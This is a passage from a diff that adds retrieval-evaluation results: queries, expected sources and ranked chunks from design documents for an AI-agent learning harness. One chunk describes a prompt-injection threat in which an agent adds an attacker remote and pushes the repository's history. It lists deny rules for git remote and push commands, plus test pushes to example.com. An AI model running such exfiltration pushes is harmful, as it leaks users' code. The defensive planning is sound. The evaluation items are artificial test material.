+            "text": "# Plan: Git remote exfiltration deny rules + pre-push gitleaks hook\n\n## Context\n\nSecurity research identified `git remote add` as the highest-severity\ngap in the current sandbox configuration. A prompt injection could add\nan attacker-controlled remote and push the entire commit history to it.\nNone of the existing five defense layers catch this. The fix: deny rules\nblocking all remote mutation, plus a pre-push gitleaks hook as defense\nin depth.\n\n## Files to modify\n\n- `~/.claude/settings.json` — add deny rules (Hart edits manually)\n- `~/.git-hooks/pre-push` — new gitleaks pre-push hook\n- `/Users/rhhart/Documents/GitHub/weft/guides/safer-yolo-mode.md` — see §4\n- Gist: `https://gist.github.com/hartphoenix/698eb8ef8b08ad2ce6a99cf7346cd7cc` — see §5\n- `/Users/rhhart/Documents/GitHub/roger/drafts/2026-03-04-yolo-mode-security-research.md` — update\n- `/Users/rhhart/Documents/GitHub/roger/drafts/2026-03-04-yolo-sandbox-settings-plan.md` — update\n\n## 1. Deny rules to add to settings.json permissions.deny[]\n\n### Remote mutation\n```\n\"Bash(git remote add *)\",\n\"Bash(git remote set-url *)\",\n\"Bash(git remote rename *)\",\n\"Bash(git remote remove *)\",\n\"Bash(git remote rm *)\",\n```\n\n### Direct URL push (bypass named remotes)\n```\n\"Bash(git push https://*)\",\n\"Bash(git push http://*)\",\n\"Bash(git push git@*)\",\n\"Bash(git push git://*)\",\n\"Bash(git push ssh://*)\",\n\"Bash(git push --repo*)\",\n```\n\n### Config-based remote manipulation\n```\n\"Bash(git config remote.*)\",\n\"Bash(git config --local remote.*)\",\n\"Bash(git config --add remote.*)\",\n\"Bash(git config --replace-all remote.*)\",\n\"Bash(git config --unset remote.*)\",\n\"Bash(git config --unset-all remote.*)\",\n\"Bash(git config url.*)\",\n\"Bash(git config --local url.*)\",\n\"Bash(git config --add url.*)\",\n\"Bash(git config --replace-all url.*)\",\n```\n\nNote: `git config credential.*` is intentionally omitted — it is\n**ask-gated** via the guard hook (not hard-denied), per the sandbox\nsettings plan. Credential config has legitimate uses during setup.\n\n### Runti",
+            "charCount": 2000
+          },
+          {
+            "rank": 2,
+            "score": 0.6555873814771737,
+            "source": "design/complete/2026-03-05-git-remote-exfil-deny-rules.md",
+            "section": "chars 8500-10500",
+            "text": "on.tool < ~/.claude/settings.json`\n2. Test: `git remote add test https://example.com` → should be denied\n3. Test: `git push origin main` → should still work\n4. Test: `git push https://example.com main` → should be denied\n5. Test: `gh pr checkout 11` → should still work (gh subprocess)\n6. Install pre-push hook, test: push a commit with a known secret pattern → should be caught\n7. Verify `.git/config` and `.gitmodules` writes are ask-gated by guard hook\n\n## 4. Guide updates: `safer-yolo-mode.md`\n\nThe guide needs these changes to reflect the new rules:\n\n### 4a. JSON settings block (lines 191–396)\n\nAdd the new deny rules from §1 into the JSON block. Insert a new\ncategory group after the existing git rules (line 252), with a comment\nreference in the line-number index (lines 173–189):\n\n- **Git remote exfiltration** — remote mutation, direct-URL push,\n  config-based remote manipulation, `--git-dir`/`--work-tree` variants,\n  plumbing push, submodule add, env var overrides (`export`/`env`\n  variants included), data export (`fast-export`, `bundle create`)\n\nAlso add `.gitmodules` to the `sandbox.filesystem.denyWrite` array\nin the JSON block.\n\n### 4b. Layer 5 → Layers 5+6\n\nRename current \"Layer 5: Pre-commit secret scanning\" and add a new\nsection for the pre-push hook:\n\n> **Layer 6: Pre-push secret scanning**\n>\n> A global git hook that scans commits being pushed for secrets that\n> bypassed the pre-commit check (e.g., commits made before gitleaks was\n> installed, or commits from other machines). Uses gitleaks in git-log\n> mode. Skips branch deletions.\n\nUpdate \"five layers\" references in the guide body (lines 683–684) to\n\"six layers.\"\n\n### 4c. Setup: add Step 2b\n\nAfter the existing pre-commit hook setup (Step 2), add the pre-push\nhook installation:\n\n> Write this to `~/.git-hooks/pre-push`:\n>\n> (pre-push script from §3 of this plan)\n>\n> ```bash\n> chmod +x ~/.git-hooks/pre-push\n> ```\n\n### 4d. \"What's Protected\" section\n\nAdd a new bullet under \"Protected\" (after line 491):\n\n> - **Gi",
+            "charCount": 2000
+          },
+          {
+            "rank": 3,
+            "score": 0.6549685782456505,
+            "source": "design/complete/claudemd-hardening-plan.md",
+            "section": "chars 0-2000",
+            "text": "# Plan: CLAUDE.md Hardening — Prevent Agent Workflow Mistakes\n\n**Status:** Approved, not yet implemented\n\n## Context\n\nA transcript review of a complex git bucketing session revealed 6 agent mistakes. Three were known Claude Code platform bugs (destructive git preference, scope creep after interrupt, shell scripting errors). Three were amplified by gaps in maestro's CLAUDE.md content: no scope-reset-on-interrupt directive, no complex-operation decision-point guidance, and an abstract surprise-trigger that never fired under pressure. This plan hardens all CLAUDE.md files before shipping and adds a command-guard recommendation to the README. Source transcript: `git complications.txt` (repo root, untracked).\n\n**Critical discovery:** The intake SKILL.md template (section 3a) generates a CLAUDE.md that currently has NO recovery protocol, NO decision-point guidance, and NO surprise-trigger. When intake runs, it replaces `package/CLAUDE.md` — so any directives added only to the pre-intake placeholder are lost. The intake template must also be updated.\n\n---\n\n## Task 1: Confirm no Edit/Write allow in package (report only)\n\nNo action needed. Confirmed: `package/.claude/` contains only `consent.json`, `hooks/`, `references/`, and `skills/`. No `settings.json` or `settings.local.json` exists. The Edit/Write allow-list workaround (for bug #22122) is confined to the developer environment at `maestro/.claude/settings.local.json` and does not ship.\n\n---\n\n## Task 2: Fix \"ship fast\" language\n\n**File:** `/Users/rhhart/Documents/GitHub/CLAUDE.md` (workspace)\n\nLine 17 — replace:\n```\n- Ship working software fast, polish iteratively\n```\nwith:\n```\n- Prefer working software over perfect plans — iterate to polish\n```\n\nPreserves the iteration preference. Removes urgency framing that can prime the agent to skip plan mode on complex operations.\n\n**Other files:** maestro/CLAUDE.md and package/CLAUDE.md confirmed clean — no urgency language. The intake template placeholder (`[Workflow: ship fast v",
+            "charCount": 2000
+          }
+        ],
+        "hit": true,
+        "totalPayload": 6000
+      },
+      {
+        "id": "r4-cross-project",
+        "query": "Sandbox cross-project write restrictions — harness writing to learning state from another project directory",
+        "context": "Harness needs to write to learning/ from a different project CWD. Sandbox may block this.",
+        "expectedSources": [
+          "design/"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.6623122030274565,
+            "source": "design/projects-feature.md",
+            "section": "chars 0-2000",
+            "text": "# Persistent Project Registry (`learning/projects.md`)\n\n**Status:** Designed. Implements P3 feature \"Project-goal mapping\" from\n`design/harness-features.md`.\n\n---\n\n## Problem\n\nIntake gathers rich project information during the interview (what the\nlearner is working on, why it matters, what's blocked, what skills it\nneeds) — but that information dissolves when `.intake-notes.md` is\ndeleted at the end of intake. The synthesized outputs (goals, arcs,\ncurrent-state, CLAUDE.md) capture learning-oriented abstractions, not\nproject-specific state.\n\nStartwork can't surface \"here are your active projects and what each\nneeds next\" because that data doesn't persist. Its project awareness is\nlimited to git state in the current working directory and session log\nthreads — no cross-repo view, no persistent next-steps.\n\nP3 says: \"Projects are instruments for closing the gap. A well-chosen\nproject puts the learner at an edge where the work of doing the project\nIS the work of moving toward the goal.\" But projects aren't first-class\nstate yet — they're referenced obliquely in arcs and scattered across\nsession logs. This feature makes them first-class.\n\n---\n\n## File format: `learning/projects.md`\n\nMarkdown with structured fields, matching the `arcs.md` pattern.\n\n```markdown\n# Projects\n\nActive projects the learner is building. Each project is an instrument\nfor closing the gap between current state and goals.\n\n## [Project Name]\n\n[1-2 sentences: what it is and why it matters to the learner.]\n\n**Path:** [absolute filesystem path to project root, or `--`]\n**Repo:** [GitHub owner/repo for `gh` commands, or `--`]\n**Status:** active | paused | complete\n**Deadline:** YYYY-MM-DD | none\n**Serves:** [goal name from goals.md]\n**Arcs:** [comma-separated arc names from arcs.md]\n**Why:** [intrinsic motivation — what the learner wants from this]\n**Needs next:** [most concrete next action]\n**Last touched:** YYYY-MM-DD\n```\n\n### `Path` and `Repo` — the agent's handles on the project\n\n- **`Path`** — absolut",
+            "charCount": 2000
+          },
+          {
+            "rank": 2,
+            "score": 0.64257928719888,
+            "source": "design/projects-feature.md",
+            "section": "chars 15300-17300",
+            "text": "ghter and puts the prompt where it's most useful — at\nsession start, when the user is deciding what to work on.\n\n### State conflicts between records\n\nMultiple sources describe project state. They can disagree:\n\n| Source | What it says | Authority |\n|--------|-------------|-----------|\n| `projects.md` `Needs next` | Last session-review's assessment | Persistent, explicit |\n| Session log \"remaining work\" | What the most recent session ended with | Session-scoped, may be more recent than projects.md |\n| Git state at `Path` | What's actually on disk — branches, uncommitted work, merged PRs | Ground truth for code state |\n| Schedule/TODO files in project | Deadlines, task lists maintained outside the harness | Project-local, may contradict `Deadline` |\n\nThe plan doesn't specify a reconciliation protocol. Proposal:\n\n**Startwork treats git state as ground truth for code state and\nprojects.md as ground truth for learning state.** When they conflict,\nstartwork names the conflict rather than silently picking one:\n\n> \"Projects file says 'write API endpoints' but the api branch at\n> ~/projects/app was merged 3 days ago. Looks like that's done — want\n> me to update the project?\"\n\nThis keeps the human in the loop (P7) and uses startwork's Gather phase\n— where it already reads both sources — as the natural reconciliation\npoint.\n\nFor session log vs. projects.md conflicts: the most recent session log's\n\"remaining work\" should generally win over an older `Needs next`, since\nit's closer to the actual state. Session-review already updates `Needs\nnext` from session evidence — the conflict only arises when session-\nreview wasn't run. Startwork could prefer the session log's remaining\nwork when it's more recent than `Last touched`.\n\n---\n\n## Before implementing: what this plan still needs\n\nThe skill changes sections (Intake, Session-review, Startwork) describe\nthe core data flow: seed, update, read. But the open questions above\nsurface design work that hasn't been promoted into those secti",
+            "charCount": 2000
+          },
+          {
+            "rank": 3,
+            "score": 0.6410841538542158,
+            "source": "design/projects-feature.md",
+            "section": "chars 6800-8800",
+            "text": "ound: check at most 5 project paths. If more active projects have\n   paths, prioritize by Last touched (most recent first). This keeps\n   startup time reasonable while covering the most relevant projects.\n\n3. **Step 4 (Learning state):** Add `projects.md` extraction — project\n   names, status, needs-next, deadline, serves, arcs, why, path.\n   Prioritize `active`. Skip `complete`. Note `paused` in \"Also on your\n   radar\" only if close to resumable.\n\n4. **Tier 1 signals:** Add:\n   - `Needs next` from `projects.md` — cross-repo continuation, ranks\n     below uncommitted git work, above session log \"remaining work\"\n   - Uncommitted work at a project's `Path` (from cross-repo check) —\n     ranks same as CWD uncommitted work\n\n5. **Tier 2:** `Deadline` field feeds directly into proximity computation.\n\n6. **Tier 4:** Add join path: project -> `Arcs` -> arc current state ->\n   concept scores -> growth edge. Anchors growth-edge items to real\n   projects rather than abstract arc analysis.\n\n7. **Graceful degradation table:** Add row:\n   `projects.md missing` | Tiers 1 and 4 operate from git + session\n   logs only. No mention to user.\n\n### Harness features (`design/harness-features.md`)\n\nMark \"Project-goal mapping\" under P3 as \"Designed\" with a note pointing\nto this document and `learning/projects.md`.\n\n---\n\n## Data flow\n\n```\nIntake interview\n    │\n    ├── \"What are you working on? Where does it live?\"\n    │\n    ▼\nlearning/projects.md (seeded)\n    │\n    ├── Path, Repo, Status, Deadline, Serves, Arcs, Why, Needs next\n    │\n    ▼\nSession-review (updates after each session)\n    │\n    ├── Updates: Needs next, Status, Last touched, Arcs\n    ├── Preserves: Why, Serves, Path, Repo\n    │\n    ▼\nStartwork (reads at session start)\n    │\n    ├── Step 2: git state at each project Path\n    ├── Tier 1: Needs next as continuation signal\n    ├── Tier 2: Deadline proximity\n    ├── Tier 4: Arcs -> growth-edge composition\n    ├── Briefing: Serves + Why for narrative\n    │\n    ▼\nSession briefing\n```",
+            "charCount": 2000
+          }
+        ],
+        "hit": true,
+        "totalPayload": 6000
+      },
+      {
+        "id": "r5-dag",
+        "query": "DAG data structures for learning state — representing skill composition, concept dependencies, and developmental complexity",
+        "context": "User researching how to represent learning concepts as a directed acyclic graph.",
+        "expectedSources": [
+          "research/"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.8150907464716115,
+            "source": "research/dag-representation-research.md",
+            "section": "chars 0-2000",
+            "text": "# DAG Representation Research: Full Findings\n\n**Date:** 2026-03-06\n**Purpose:** Comprehensive research into data structures and types for\nrepresenting deeply nested DAGs in traversable, legible, and\nreconfigurable ways — serving the learning-state evolution described in\n`design/2026-03-06-learning-state-evolution.md` and the broader\ndevelopmental representation problem in\n`design/learning-model-research-plan.md`.\n\n**Method:** Six parallel research agents covering: JSON DAG schemas,\nfringe graph theory, ML knowledge representations, game skill trees,\ngraph databases/query languages, and ten cross-domain analogies.\n\n---\n\n## Part I: The Core Structural Problem\n\nThe learning state tracks skills that compose into higher-order skills.\nThe relationships form a DAG (not a tree) because a skill can be\ncomposed by multiple higher-order skills. Each node carries: mastery\nscore, gap type, complexity range, goal-relevance weights. The system\nneeds to answer queries like \"highest-priority growth edges given\ncurrent goals\" and \"everything downstream of goal X.\"\n\nThe broader problem (from the research plan) adds: the DAG must\neventually represent not just cognitive complexity but also cultural\ncode access, psychological state, and depth — Freinacht's four fields.\nConcepts relate to these fields via typed edges. The system must handle\nsparse-to-dense infill, confidence bounds on assessments, and bridge\ndependencies across domains.\n\n---\n\n## Part II: JSON and Flat-File DAG Representations\n\n### Approaches compared\n\nFive JSON schema approaches were evaluated against the system's\nquery patterns, human legibility, incremental update cost, and DAG\nhandling.\n\n**1. Flat adjacency list.** Nodes as a flat map, edges as ID references\n(`composes: [id1, id2]`). The JSON Graph Specification standardizes\nthis. At <500 nodes, loading the full JSON and building in-memory\nindexes takes <1ms in bun. Human legibility is high — each node is\nself-contained except for ID references. Incremental updates are",
+            "charCount": 2000
+          },
+          {
+            "rank": 2,
+            "score": 0.7781890005194316,
+            "source": "research/dag-representation-research.md",
+            "section": "chars 8500-10500",
+            "text": "ompression of DAG adjacency structure. Algorithms run in time linear\nin compressed size. Irrelevant at current scale (~100-200 nodes).\n\n**Zippers for DAGs.** Huet's zipper (1997) only works for trees.\nErwig's Inductive Graphs (2001) provide the DAG equivalent — \"match\"\non a node to get its context and the remaining graph. Mokhov's\nalgebraic graphs are the more practical version of this idea.\n\n---\n\n## Part IV: ML and Knowledge Representation\n\n### Knowledge Space Theory (ALEKS) — the strongest single finding\n\nDoignon & Falmagne (1985). The most mathematically rigorous framework\nfor representing skill dependencies in education.\n\n**Core structure:** A *knowledge space* is a family of feasible subsets\nof skills — valid combinations a learner could possess, constrained by\nprerequisites. The *surmise relation* (a quasi-order) is the\nprerequisite DAG: if A is prerequisite for B, every knowledge state\ncontaining B also contains A.\n\n**The outer fringe.** For any knowledge state K: the outer fringe is\nskills not in K such that adding any one produces another valid state.\nThese are what the learner is *ready to learn*. **This is\nmathematically equivalent to the growth-edges query.**\n\n**The Fringe Theorem.** If the knowledge structure is a learning space,\nthe knowledge state is completely determined by the inner and outer\nfringes. Two boundary sets reconstruct the full state. Powerful\ncompression: store the DAG + boundary sets, derive everything else.\n\n**Assessment efficiency.** Despite millions of possible knowledge\nstates, ALEKS determines a student's state in ~25-30 adaptive questions\nusing Markov chain procedures that navigate the knowledge space.\n\n**Implication for the system:** The outer fringe computation is cheap\non a small DAG. It doesn't require fine-grained assessment of every\nnode — it works from the DAG structure plus a binary mastery set. This\nsidesteps the false-precision problem (Dilemma 1 in the research plan).\n\nRefs: Doignon & Falmagne, *Knowledge Spaces* (Spri",
+            "charCount": 2000
+          },
+          {
+            "rank": 3,
+            "score": 0.7698405851201119,
+            "source": "design/complete/prior-art-sources.md",
+            "section": "chars 0-2000",
+            "text": "# Theoretical Frameworks for Multi-Dimensional Learner State Representation\n\n## Research Synthesis for Maestro Learning Model\n\nThis document extends the existing research in\n`design/learning-model-research-plan.md` (Sections 1-13, covering MHC,\nStein/LAS, and Freinacht's four fields). It surveys seven additional\ntheoretical frameworks from psychometrics, computational learning science,\nand competency modeling. Each framework is evaluated for what it offers\nthe maestro system's specific problem: representing developmental state\nacross multiple dimensions with partial observability and different\nconfidence ceilings per dimension.\n\n---\n\n## 1. Fischer's Dynamic Skill Theory\n\n### What the framework says\n\nKurt Fischer's Dynamic Skill Theory (DST), developed over 40 years from\na neo-Piagetian starting point, models psychological development as the\nconstruction of increasingly complex *skills* -- capacities to act in\nparticular ways in particular contexts. Skills incorporate emotions,\nmotivation, meaning, and action. They develop through levels of\nincreasing complexity, differentiation, and integration within a dynamic\nsystem that includes self, other, and environment.\n\n### How it represents state\n\n**The constructive web.** Fischer replaces the \"ladder\" metaphor of\ndevelopment (linear, step-by-step) with the *constructive web*: a\nstructure where multiple skill strands develop simultaneously along\ndifferent pathways, at different rates, with connections between strands\nrepresenting possible relations among skill domains. The strands\nrepresent potential skill domains; connections between strands represent\nrelations among domains; differing directions of strands indicate\nvariations in developmental pathways and outcomes.\n\nThe constructive web differs from ladder metaphors in six ways:\n1. Multiple pathways can be active simultaneously\n2. Different skills can be at different complexity levels at the same time\n3. Cross-domain differences are expected (math ahead of social studies",
+            "charCount": 2000
+          }
+        ],
+        "hit": true,
+        "totalPayload": 6000
+      },
+      {
+        "id": "r6-digest-debug",
+        "query": "Session-digest subagent failing to parse JSONL conversation transcripts — missing extraction layer between discovery and synthesis",
+        "context": "Session-digest skill can't read conversation transcripts — it discovers sessions but fails to extract content.",
+        "expectedSources": [
+          "design/"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7530701065122588,
+            "source": "design/complete/improvement-plan.md",
+            "section": "chars 11900-13695",
+            "text": "it + conversation | noted for developer\"\n```\n\nThis surfaces installation gaps and unexpected mismatches between the\nsession-discovery record and the session-log record.\n\n### B3. Line budget\n\nCount lines after edits. If SKILL.md exceeds 500 lines, extract the\nsub-agent dispatch instructions (the structured return format in B1 step\n3c) to `session-review/subagents.md` and reference it from Phase 1.\nSame pattern as intake uses for sub-agent prompts.\n\n---\n\n## Implementation sequence\n\n1. **Phase A first** — session-review can't invoke the script until it\n   ships in production\n2. Update session-discovery SKILL.md path (A2 first sub-step)\n3. Copy `scripts/session-discovery.ts` from weft-dev to production weft (A1)\n4. Copy `.claude/skills/session-discovery/` from weft-dev to production\n   weft (A2)\n5. Commit and push production weft (A3)\n6. Confirm hook change is present (A4 verify step)\n7. Test via weftclone — pull, run script, test hook detection, restore\n   symlink (A5a–d)\n8. Read current `session-review/SKILL.md` in full — confirm exact lines\n   being replaced (Phase 1 steps 3 and 4)\n9. Replace Phase 1 step 3 with the new 3a–3e pipeline, absorbing step 4 (B1)\n10. Add session-discovery category to Phase 4 agent observations (B2)\n11. Count lines — verify under 500; extract to subagents.md if over (B3)\n\n## Verification\n\n1. Read SKILL.md end-to-end for coherence as a standalone document\n2. Context management gate: three concrete tiers with numbers, not\n   subjective assessment\n3. Sub-agent prompt spec: complete enough to follow without guessing\n4. Script path uses `$(cat ~/.config/weft/root)` — no hardcoded paths\n5. Session logs correctly positioned as deduplication-only, not primary\n   evidence\n6. Phase 4 signal includes session-discovery category\n7. Line count under 500",
+            "charCount": 1795
+          },
+          {
+            "rank": 2,
+            "score": 0.7316292642389728,
+            "source": "design/complete/improvement-plan.md",
+            "section": "chars 10200-12200",
+            "text": "nce: [quote or paraphrase]\n\n  growth_edges:\n    - topic: [name]\n      gap_type: conceptual | procedural | recall\n      evidence: [quote or paraphrase]\n\n  procedural_observations:\n    - [observation]\n  ```\n\nMain agent synthesizes sub-agent reports + git evidence. Never falls\nback to reading raw JSONL itself once sub-agents are dispatched. If a\nsub-agent fails, retry once; if it fails again, proceed without that\nsession and note it in Phase 4 signal.\n\n#### 3d. Session log deduplication (clarified role)\n\nCheck `learning/session-logs/` for frontmatter from already-reviewed\nsessions in the window. Their `concepts:` lists show what's already\nbeen quizzed — don't re-quiz those concepts.\n\n**This is a deduplication step only.** Session log files are summaries\nsession-review wrote; they do not contain evidence from sessions not yet\nreviewed. The JSONL files (via session-discovery) are the primary\nevidence source for prior sessions.\n\n#### 3e. Scaffold predictions validation (unchanged)\n\nCheck `learning/scaffolds/` for scaffold files dated within the review\nwindow. Compare concept classifications against actual session evidence.\nDiscrepancies (predicted \"solid\" → struggled; predicted \"gap\" → handled\nfine) are high-value calibration data for Phase 4.\n\n---\n\n### B2. Add session-discovery category to Phase 4 agent observations\n\nIn the `agent_observations` section, add `session-discovery` as a\nrecognized category. Report any of the following if they occurred:\n\n```yaml\n- category: session-discovery\n  expected: \"script runs, returns N sessions in window\"\n  found: \"script not found | exit error | 0 sessions returned despite active window | count lower than expected\"\n  action: \"fell back to git + conversation | noted for developer\"\n```\n\nThis surfaces installation gaps and unexpected mismatches between the\nsession-discovery record and the session-log record.\n\n### B3. Line budget\n\nCount lines after edits. If SKILL.md exceeds 500 lines, extract the\nsub-agent dispatch instructions (the stru",
+            "charCount": 2000
+          },
+          {
+            "rank": 3,
+            "score": 0.706821790441934,
+            "source": "design/2026-03-05-learning-loop-analysis.md",
+            "section": "chars 10200-12200",
+            "text": "ths:\n1. Dispatched as foreground sub-agent by session-review (Phase 1)\n2. Dispatched as background sub-agent by startwork (step 3c)\n3. Direct user invocation: `/session-digest`\n\n**What it does:** Pure function — returns a structured learning-state\ndiff without quizzing or writing files. Callers handle presentation,\napproval, and writes.\n\n**Phases 1-2 — Discover + Extract.**\n1. Determine digest window start (from `.last-digest-timestamp`,\n   falling back to oldest session log date, `current-state.md` creation\n   date, or 30 days ago)\n2. Run session-discovery to find sessions in the window\n3. Filter: exclude current session\n4. Context management gate for extraction:\n   - 0-1 sessions + <200 messages -> inline read\n   - 2-3 sessions OR 200-500 messages -> single sub-agent\n   - 4+ sessions OR >500 messages -> parallel sub-agents per session\n5. For each session, extract:\n   - `concepts_encountered`: name, evidence, signal type (new_exposure /\n     struggle / breakthrough / teaching / deepening), estimated score,\n     gap type, confidence\n   - `procedural_observations`: workflow patterns, tool usage, debugging\n\n**Phase 3 — Synthesize.** Compare extracted concepts against\n`current-state.md`. Build proposed diff with four sections:\n- **Score changes:** existing concepts with new evidence warranting\n  score update\n- **New evidence:** existing concepts, score unchanged, new data point\n  added to history\n- **New concepts:** not in current-state.md, proposed score and gap type\n- **Flags:** activity not mapping to existing arcs, contradictory\n  signals, heavily-used concepts with no entry\n\n**Output:** Structured diff (markdown). No file writes.\n\nWhen invoked standalone: user approves/adjusts/rejects. Approved\nchanges written to `current-state.md`. `.last-digest-timestamp` updated\nto latest digested session date.\n\n---\n\n### Lesson Scaffold (Pre-Work Analysis)\n\n**Trigger:** User provides learning material (URL, file, pasted text)\nand runs `/lesson-scaffold`.\n\n**What it does:**\n1. R",
+            "charCount": 2000
+          }
+        ],
+        "hit": true,
+        "totalPayload": 5795
+      },
+      {
+        "id": "r7-domain-map",
+        "query": "Domain map schema breaking learning loop skills — migrating from flat YAML current-state to structured domain graph",
+        "context": "User planning migration from flat YAML learning state to a nested domain graph structure.",
+        "expectedSources": [
+          "design/",
+          "research/"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7885772212705338,
+            "source": "design/2026-03-07-domain-graph-integration-plan.md",
+            "section": "chars 1700-3700",
+            "text": "rner data paths resolve from CLAUDE.md path mappings.\n\n**What exists on the branch:**\n\n| Artifact | Status |\n|----------|--------|\n| `scripts/types/domain-graph.ts` | Complete (77 lines) |\n| `scripts/types/learner-state.ts` | Complete (57 lines) |\n| `scripts/lib/graph-queries.ts` | Complete (476 lines) — fringe, priority, practice mode, coverage, surmise |\n| `scripts/migrate-observations.ts` | Complete (509 lines) — legacy YAML to learner state JSON |\n| `.claude/references/domain-graph-schema.md` | Complete (286 lines) |\n| `.claude/skills/domain-map/SKILL.md` | Complete (394 lines) |\n| `.claude/skills/domain-map/subagents.md` | Complete (402 lines) |\n| `.claude/skills/domain-update/SKILL.md` | Complete (156 lines) |\n| `docs/schema-guide.md` | Complete (176 lines) |\n| `domains/.gitkeep` | Placeholder only — no domain graphs yet |\n\n**What the branch does NOT touch:** Any existing skill that reads or\nwrites learning state. Every skill on main still targets the old\n`learning/current-state.md` YAML format.\n\n---\n\n## What's broken\n\nEvery skill in the learning loop reads/writes a single\n`learning/current-state.md` (YAML markdown) that conflates domain\ntopology and learner observations. The new schema splits this into two\nJSON files with different structures, different paths, and different\nfield names.\n\n**Old format example** (`learning/current-state.md`):\n\n```yaml\n  - name: react-hooks\n    arc: react-fundamentals\n    score: 4\n    source: audit:observed\n    last-quizzed: 2026-02-10\n    times-quizzed: 1\n    history:\n      - { date: 2026-02-10, score: 3, note: \"...\" }\n```\n\n**New format equivalent** (`learning/state/<slug>.state.json`):\n\n```json\n\"react-hooks\": {\n  \"score\": 4,\n  \"gap\": null,\n  \"fluencyTarget\": \"production\",\n  \"chunkingState\": \"consolidated\",\n  \"chunkingSelfReport\": \"fluency\",\n  \"lastAssessed\": \"2026-02-10\",\n  \"timesAssessed\": 1,\n  \"assessments\": [\n    { \"date\": \"2026-02-10\", \"score\": 3, \"source\": \"session-review:quiz\",\n      \"gap\": \"procedural\", \"instrument\": \"q",
+            "charCount": 2000
+          },
+          {
+            "rank": 2,
+            "score": 0.776837885520486,
+            "source": "design/2026-03-07-domain-graph-integration-plan.md",
+            "section": "chars 5100-7100",
+            "text": " actual prerequisite edges from domain graph\n- Tier 4 (Growth-edge) uses ordering heuristic from developmental model\n  but not the fringe computation from `graph-queries.ts`\n- Dispatches session-digest (Step 3c) whose output targets old format\n\n**intake** (onboarding — generates initial state)\n- Phase 3d generates `current-state.md` as YAML\n- Also generates `arcs.md` and `goals.md` as separate markdown files\n- New schema puts arcs in domain graph, goals in learner state\n- Intake runs before any domain graph exists — needs a bootstrap path\n\n**progress-review** (cross-session analysis)\n- All four lenses (concept, arc, goal, learner model) read old format\n- Concept lens checks scores/stalls/regressions against YAML entries\n- Could use `assessments[]` array for richer velocity analysis\n\n**lesson-scaffold** (material restructuring)\n- Reads `current-state.md` to classify concepts\n- Could use prerequisite edges for actual gap detection\n\n### Structural gaps\n\n**`learning/arcs.md` redundancy.** Arc definitions (name, description,\noutcomes, dependencies) now live in the domain graph. `arcs.md`\nadditionally carries learner-facing commentary (current state, next\nmove, bridges) that has no home in either new file. Decision needed.\n\n**`learning/goals.md` redundancy.** Goal definitions now live in the\nlearner state file. `goals.md` carries richer context (capabilities\ndemonstrated, structural model, incoming skills) that exceeds what the\n`Goal` interface holds.\n\n**Session log format.** Frontmatter references arcs by name string and\nconcepts by name string. Domain graphs use concept IDs (slugs). Need\nalignment or a lookup path.\n\n**No domain graph exists yet.** The branch has the generation skill\n(`domain-map`) and the migration script, but no actual domain graph has\nbeen produced. The migration script needs a domain graph as input to\nmap legacy concepts onto.\n\n---\n\n## Update sequence\n\nEight phases. Each phase produces a testable, internally consistent\nstate. Phases 1-3 are infrastru",
+            "charCount": 2000
+          },
+          {
+            "rank": 3,
+            "score": 0.7648341034832196,
+            "source": "design/2026-03-07-domain-graph-integration-plan.md",
+            "section": "chars 17000-19000",
+            "text": "ng what domain\nto map.\n\nFor users without source materials readily available, offer a\nlightweight alternative: a \"bootstrap graph\" generated from the\nconcepts already in `current-state.md`. This produces a minimal domain\ngraph (concepts + inferred arcs, no prerequisite edges or knowing\nprofiles) that's enough for migration. The user can enrich it later\nwith `/domain-update` when they have source materials.\n\n**Step 3: Migration.** Run `migrate-observations.ts` to map legacy\nconcepts onto the domain graph. The script:\n- Parses `current-state.md` YAML\n- Matches legacy concept names to domain graph concept IDs (slug match\n  or name match)\n- Extracts bridges from `arcs.md` (pattern-matches bridge language)\n- Extracts goals from `goals.md` (## headings become Goal objects)\n- Infers `chunkingState` from scores (no `chunkingSelfReport` — legacy\n  format doesn't have it)\n- Produces `learning/state/<slug>.state.json`\n- Reports orphans for manual resolution\n\n**Known behavior:** The migration script drops arc association from\nmatched observations. The legacy format stores `arc: react-fundamentals`\non each concept; the new `ConceptObservation` has no arc field (arc\nmembership lives in `ConceptNode.arc` in the domain graph). This is\ncorrect by design — but means the domain graph must have every concept\nassigned to an arc, or the arc association is lost.\n\n**Step 4: Orphan resolution.** Legacy concepts that don't match any\ndomain graph concept are reported. User decides:\n- Add missing concepts to the domain graph (`/domain-update`)\n- Map them manually to existing concepts (rename/merge)\n- Drop them (if subsumed by domain graph concepts)\n\n**Step 5: Verification.** After migration:\n- Skills read the new format and confirm it works\n- Old files are NOT deleted automatically — kept as backup until\n  the user confirms the migration is correct\n- A flag file (`learning/.migration-complete`) marks that migration\n  has run, so skills stop prompting\n\n### Graceful degradation during transition",
+            "charCount": 2000
+          }
+        ],
+        "hit": true,
+        "totalPayload": 6000
+      },
+      {
+        "id": "r8-domain-schema",
+        "query": "Implementing domain graph and learner state type definitions — compositional nesting, complexity ranges, growth edges",
+        "context": "User implementing TypeScript types for the domain graph schema.",
+        "expectedSources": [
+          "design/",
+          "research/",
+          "learning/goals.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7580579058590691,
+            "source": "design/2026-03-07-domain-graph-integration-plan.md",
+            "section": "chars 5100-7100",
+            "text": " actual prerequisite edges from domain graph\n- Tier 4 (Growth-edge) uses ordering heuristic from developmental model\n  but not the fringe computation from `graph-queries.ts`\n- Dispatches session-digest (Step 3c) whose output targets old format\n\n**intake** (onboarding — generates initial state)\n- Phase 3d generates `current-state.md` as YAML\n- Also generates `arcs.md` and `goals.md` as separate markdown files\n- New schema puts arcs in domain graph, goals in learner state\n- Intake runs before any domain graph exists — needs a bootstrap path\n\n**progress-review** (cross-session analysis)\n- All four lenses (concept, arc, goal, learner model) read old format\n- Concept lens checks scores/stalls/regressions against YAML entries\n- Could use `assessments[]` array for richer velocity analysis\n\n**lesson-scaffold** (material restructuring)\n- Reads `current-state.md` to classify concepts\n- Could use prerequisite edges for actual gap detection\n\n### Structural gaps\n\n**`learning/arcs.md` redundancy.** Arc definitions (name, description,\noutcomes, dependencies) now live in the domain graph. `arcs.md`\nadditionally carries learner-facing commentary (current state, next\nmove, bridges) that has no home in either new file. Decision needed.\n\n**`learning/goals.md` redundancy.** Goal definitions now live in the\nlearner state file. `goals.md` carries richer context (capabilities\ndemonstrated, structural 